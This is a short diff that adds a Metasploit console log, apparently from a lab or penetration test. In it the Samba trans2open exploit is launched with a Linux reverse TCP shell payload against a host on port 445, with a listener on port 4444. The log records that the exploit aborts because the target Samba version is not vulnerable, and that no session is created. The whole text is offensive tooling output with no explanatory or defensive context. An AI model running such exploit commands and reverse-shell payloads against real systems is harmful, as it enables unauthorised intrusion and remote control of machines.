@@ -1,0 +1,8 @@
+msf6 exploit(linux/samba/trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
+PAYLOAD => linux/x86/shell_reverse_tcp
+msf6 exploit(linux/samba/trans2open) > exploit
+
+[*] Started reverse TCP handler on 192.168.88.22:4444 
+[*] 192.168.88.32:445 - Trying return address 0xbffffdfc...
+[-] 192.168.88.32:445 - Exploit aborted due to failure: no-target: This target is not a vulnerable Samba server (Samba 4.3.11-Ubuntu)
+[*] Exploit completed, but no session was created.
